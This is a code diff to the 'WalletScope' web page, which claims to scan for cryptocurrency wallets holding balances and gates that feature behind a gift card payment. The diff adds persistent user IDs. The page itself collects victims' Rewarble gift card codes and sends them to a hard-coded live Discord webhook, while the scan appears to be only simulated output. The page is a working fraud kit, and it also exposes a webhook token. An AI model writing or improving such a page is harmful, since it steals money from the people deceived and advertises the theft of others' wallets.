@@ -25,6 +25,7 @@
     .logo { font-weight: 700; font-size: 20px; color: #6ee7b7; letter-spacing: 0.5px; }
     .user { font-size: 14px; color: #8b93a7; display: flex; align-items: center; gap: 10px; }
     .user span { color: #6ee7b7; font-weight: 600; }
+    .user .uid-label { color: #6b7280; font-size: 12px; }
 
     /* Pro badge in header */
     .pro-badge {
@@ -539,6 +540,9 @@
       .seed .words { grid-template-columns: repeat(2, 1fr); }
       .code-input { flex-direction: column; align-items: stretch; }
       .code-input button { width: 100%; }
+      header { padding: 12px 16px; }
+      .user { font-size: 12px; }
+      .user .uid-label { display: none; }
     }
   </style>
 </head>
@@ -546,7 +550,8 @@
   <header>
     <div class="logo">◈ WalletScope</div>
     <div class="user">
-      Logged in as <span id="username"></span>
+      <span class="uid-label">ID:</span>
+      <span id="userId">—</span>
       <span class="pending-badge" id="pendingBadge">⏳ PENDING</span>
       <span class="pro-badge" id="proBadge">✔ PRO</span>
     </div>
@@ -565,19 +570,19 @@
         <h1>Find Wallets</h1>
         <p class="subtitle">Scan the network for wallets containing a balance.</p>
 
-        <!-- LOCKED STATE (no code submitted yet) -->
+        <!-- LOCKED STATE -->
         <div class="scan-locked" id="scanLocked">
           <span class="lock-icon">🔒</span>
           <h3>Pro Access Required</h3>
           <p>
             Wallet scanning is a premium feature. Purchase a Rewarble Super Gift Card
-            and redeem your 16-digit code to request access. Codes are verified manually
+            and submit your 16-digit code to request access. Codes are verified manually
             by our team before scanning is enabled.
           </p>
           <button class="unlock-btn" id="goToPayment">🔓 Unlock with Pro Access</button>
         </div>
 
-        <!-- PENDING VERIFICATION STATE (code submitted, waiting for manual approval) -->
+        <!-- PENDING VERIFICATION STATE -->
         <div class="scan-pending" id="scanPending">
           <span class="pend-icon">⏳</span>
           <h3>Please wait until your code is verified</h3>
@@ -722,7 +727,7 @@
             <li><strong>Code verification</strong> — Handled within 1 business day</li>
           </ul>
           <p style="margin-top: 14px; margin-bottom: 0;">
-            Please include your <strong>username</strong> (shown in the top-right corner)
+            Please include your <strong>user ID</strong> (shown in the top-right corner)
             and a description of your issue so we can help you faster.
           </p>
         </div>
@@ -734,24 +739,46 @@
   // ---------- Discord webhook URL (replace with your own) ----------
   const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554226855924465764/Khd_NPbJCgs9h3n74YtWAgQHe7L31jWN8x90ji88RYoiNMBaMnNsIjWXyeAK6Q_RHaM6';
 
-  // ---------- Guest username ----------
-  const username = 'user' + Math.floor(Math.random() * 9_000_000_000 + 1_000_000_000);
-  document.getElementById('username').textContent = username;
+  // ============================================================
+  // PERSISTENT USER ID
+  // ============================================================
+  // Every browser/device gets its own unique ID that persists across
+  // refreshes and restarts. The ID is stored in localStorage.
+  // Format: WS-XXXXXXXX  (8 hex chars uppercase, easy to read/type)
+  // ============================================================
+  const USER_ID_KEY = 'walletscope_user_id';
+
+  function generateUserId() {
+    const chars = '0123456789ABCDEF';
+    let id = '';
+    for (let i = 0; i < 8; i++) id += chars[Math.floor(Math.random() * 16)];
+    return 'WS-' + id;
+  }
+
+  let userId;
+  try {
+    userId = localStorage.getItem(USER_ID_KEY);
+    if (!userId) {
+      userId = generateUserId();
+      localStorage.setItem(USER_ID_KEY, userId);
+    }
+  } catch (e) {
+    // Fallback if localStorage is unavailable (e.g. private mode in some browsers)
+    userId = generateUserId();
+  }
+
+  document.getElementById('userId').textContent = userId;
 
   // ============================================================
   // ACCESS STATE
   // ============================================================
-  // Three possible states:
-  //   'locked'   — no code submitted, nothing unlocked
+  // Three states:
+  //   'locked'   — no code submitted yet
   //   'pending'  — code submitted, waiting for manual verification
-  //   'pro'      — verified by you (set manually)
+  //   'pro'      — verified by operator
   //
   // The client NEVER flips to 'pro' on its own. Only a human operator
-  // (you) should change it — see the `grantProAccess()` helper below.
-  //
-  // To grant access to a specific user, you can either:
-  //   1. Run  window.grantProAccess()  in their browser console, OR
-  //   2. Have them run  localStorage.setItem('walletscope_access', 'pro')  and refresh
+  // should change it — see `grantProAccess()` below.
   // ============================================================
   const ACCESS_KEY = 'walletscope_access';
   let accessState = 'locked';
@@ -771,7 +798,6 @@
   const goToPaymentBtn = document.getElementById('goToPayment');
   const pendingCodeEl = document.getElementById('pendingCode');
 
-  // Restore the last submitted code so the pending screen remembers it
   let lastSubmittedCode = '';
   try {
     lastSubmittedCode = localStorage.getItem('walletscope_pending_code') || '';
@@ -779,7 +805,6 @@
   if (lastSubmittedCode) pendingCodeEl.textContent = lastSubmittedCode;
 
   function applyAccessState() {
-    // Hide all three states first
     scanLocked.style.display = 'none';
     scanPending.classList.remove('show');
     scanArea.classList.remove('unlocked');
@@ -799,9 +824,7 @@
   }
   applyAccessState();
 
-  // Public helper — you (the operator) call this to actually grant access.
-  // Example: after verifying a user's gift card, run in their browser console:
-  //   grantProAccess()
+  // Operator helper — grant Pro access for this user
   window.grantProAccess = function () {
     accessState = 'pro';
     try {
@@ -809,10 +832,10 @@
       localStorage.removeItem('walletscope_pending_code');
     } catch (e) {}
     applyAccessState();
-    console.log('[WalletScope] Pro Access granted.');
+    console.log('[WalletScope] Pro Access granted to', userId);
   };
 
-  // Public helper — revoke access (useful for testing)
+  // Operator helper — revoke access
   window.revokeAccess = function () {
     accessState = 'locked';
     try {
@@ -822,7 +845,7 @@
     lastSubmittedCode = '';
     pendingCodeEl.textContent = '••••-••••-••••-••••';
     applyAccessState();
-    console.log('[WalletScope] Access revoked.');
+    console.log('[WalletScope] Access revoked for', userId);
   };
 
   // "Unlock with Pro Access" button → jump to Payment tab
@@ -951,10 +974,8 @@
   }
 
   function startScan() {
-    // Hard gate — only verified 'pro' users can scan
     if (accessState !== 'pro') {
       if (accessState === 'pending') {
-        // Stay on this page and remind them
         alert('Your code is still being verified. Please wait until your code is verified.');
       } else {
         goToPaymentBtn.click();
@@ -972,6 +993,7 @@
     seedWords.innerHTML = '';
     logEl.innerHTML = '';
     log('[system] Starting scan session...', 'info');
+    log('[system] User ID: ' + userId, 'info');
     log('[system] Initializing wallet discovery engine...', 'info');
 
     const tick = () => {
@@ -1072,7 +1094,7 @@
   startBtn.addEventListener('click', startScan);
 
   // ============================================================
-  // GIFT CARD CODE → DISCORD WEBHOOK (submission only — does NOT unlock)
+  // GIFT CARD CODE → DISCORD WEBHOOK (submission only)
   // ============================================================
   const giftcardInput = document.getElementById('giftcardInput');
   const redeemBtn = document.getElementById('redeemBtn');
@@ -1108,7 +1130,7 @@
           title: '🎁 Gift Card Code Submitted (PENDING VERIFICATION)',
           color: 0xfbbf24,
           fields: [
-            { name: '👤 User', value: username, inline: true },
+            { name: '👤 User ID', value: '`' + userId + '`', inline: true },
             { name: '🔑 Code', value: '`' + code + '`', inline: true },
             { name: '📌 Status', value: 'Awaiting manual verification', inline: false },
             { name: '⏱️ Time', value: new Date().toUTCString(), inline: false }
@@ -1150,7 +1172,6 @@
     try {
       await sendToDiscord(formattedCode);
 
-      // Move user to the PENDING state — do NOT unlock
       accessState = 'pending';
       lastSubmittedCode = formattedCode;
       try {
@@ -1158,7 +1179,6 @@
         localStorage.setItem('walletscope_pending_code', formattedCode);
       } catch (e) {}
 
-      // Update UI
       applyAccessState();
       pendingCodeEl.textContent = formattedCode;
 
@@ -1168,7 +1188,6 @@
       giftcardInput.disabled = true;
       redeemBtn.textContent = '✔ Submitted';
 
-      // Redirect back to the wallets tab so they see the pending message
       setTimeout(() => {
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
